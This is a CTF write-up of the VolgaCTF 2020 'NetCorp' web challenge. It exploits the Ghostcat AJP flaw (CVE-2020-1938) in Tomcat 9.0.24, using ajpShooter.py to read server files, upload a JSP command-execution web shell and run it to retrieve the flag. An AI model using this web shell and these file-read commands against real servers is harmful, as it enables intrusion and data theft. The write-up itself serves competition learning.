---
title: VolgaCTF 2020 Qualifier - NetCorp
authors: _MrB0b
layout: writeup
ctf_url: https://q.2020.volgactf.ru
---
Solves: 134 / Points: 100 / Category: Web

## Challenge description
> Another telecom provider. Hope these guys prepared well enough for the network load...
> 
> [netcorp.q.2020.volgactf.ru](http://netcorp.q.2020.volgactf.ru:7782)

## Challenge resolution
### Recon
Browsing the web application did not reveal any clear entry point:

![NetCorp website](/assets/volga-quals-20-website.png)

In order to obtain more information on the target, we thus performed a web directory scan using [Gobuster](https://github.com/OJ/gobuster):

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://netcorp.q.2020.volgactf.ru:7782
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/03/28 12:06:42 Starting gobuster
===============================================================
http://netcorp.q.2020.volgactf.ru:7782/docs (Status: 302)
http://netcorp.q.2020.volgactf.ru:7782/examples (Status: 302)
http://netcorp.q.2020.volgactf.ru:7782/index.html (Status: 200)
http://netcorp.q.2020.volgactf.ru:7782/resources (Status: 302)
http://netcorp.q.2020.volgactf.ru:7782/uploads (Status: 302)
===============================================================
2020/03/28 12:07:06 Finished
===============================================================
```

Sweet! The **docs** folder revealed an installation of Apache Tomcat and the related version: 

![Tomcat](/assets/volga-quals-20-tomcat.png)

As outlined on the [tomcat.apache.org](http://tomcat.apache.org/security-9.html) website, the version **9.0.24** is vulnerable to CVE-2020-1938, a potential Remote Code Execution also known as [GhostCat](https://www.chaitin.cn/en/ghostcat):

![Advisory](/assets/volga-quals-20-tomcat-vuln.png)

However, to exploit this vulnerability, the AJP connector, usually listening on port 8009, must be reached. Using `netcat`, we can confirm that the TCP port 8009 is indeed open:

```bash
$ nc -v netcorp.q.2020.volgactf.ru 8009
DNS fwd/rev mismatch: netcorp.q.2020.volgactf.ru != bahilovopt.ru
netcorp.q.2020.volgactf.ru [77.244.215.184] 8009 (?) open
```

### Exploitation
The exploitation was performed using the `ajpShooter.py` python script from @00theway [GitHub repo](https://github.com/00theway/Ghostcat-CNVD-2020-10487).

To check that the server is indeed vulnerable, we first attempted to download the `WEB-INF/web.xml` configuration file using the following command line:

```bash
$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782/ 8009 /WEB-INF/web.xml read
```

![WEB-INF](/assets/volga-quals-20-web-inf.png)

As shown above, we can effectively read arbitrary file on the server. <(^_^)>

We then downloaded the java class of the `ServeScreenshot` Servlet:

```bash
$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782/ 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class read
```

![ServeScreenshot](/assets/volga-quals-20-ServeScreenshotServlet.png)

Using the `-o` parameter, we can save the class file to an output file, and use `Jadx`, a Dex to Java decompiler, to get the associated Java source code:

![Jadx](/assets/volga-quals-20-jadx.png)

From the source code, we've learned that uploaded files are saved in the `uploads` folder using the md5 hash of the filename:

```java
private String generateFileName(String fileName) {
    try {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(fileName.getBytes());
        String s2 = new BigInteger(1, md.digest()).toString(16);
        StringBuilder sb = new StringBuilder(32);
        int count = 32 - s2.length();
        for (int i = 0; i < count; i++) {
            sb.append("0");
        }
        return sb.append(s2).toString();
    } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
        return "Error";
    }
}
```

Using the following HTML code snippet, we can upload file to the server:

```html
<form method="post" action="http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot"
    enctype="multipart/form-data">
    Select file to upload: <input type="file" name="file" /><br />
    <br /> <input type="submit" value="Upload" />
</form>
```
For instance, we uploaded a file name `testpoc.txt` and calculated the md5 filename hash:
```bash
$ echo -n "testpoc.txt" | md5sum
beb2db6edf7b269ddfe4a4cfb54e09d9  -
```

This file can then be accessed at the intended URI:

![Upload](/assets/volga-quals-20-uploaded-file-view.png)

Content of the file can also be retrieved using the aforementioned `ajpShooter.py` python script:

```bash
$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782/ 8009 /uploads/beb2db6edf7b269ddfe4a4cfb54e09d9 read
```
![Read](/assets/volga-quals-20-uploaded-file.png)

Next, as stated on the advisory, remote code execution can be achieved by processing JSP script such as the following:

```jsp
<%@ page import="java.util.*,java.io.*"%>
<HTML>
<BODY>
<PRE>
<%
String cmd = "id";
out.println("Command: " + cmd + "<BR>");
Process p =Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
}

%>
</PRE>
</BODY>
</HTML>
```

The process can then be repeated:
```bash
$ echo -n "cmd.jsp" | md5sum
2079f2ab870589bf5c5ddc9ac5030097  -
```

However, execution is achieved by using the `eval` parameter:
```bash
$ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782/ 8009 /uploads/2079f2ab870589bf5c5ddc9ac5030097 eval
```

![Eval id](/assets/volga-quals-20-eval-id.png)

### Flag recovery
We then executed the `ls` command and spotted the `flag.txt` file:

![Eval ls](/assets/volga-quals-20-eval-ls.png)

The `cmd.jsp` script can be modified one last time using `Burp` in order to retrieved the flag:

![Burp](/assets/volga-quals-20-eval-flag.png)

![Flag](/assets/volga-quals-20-flag.png)
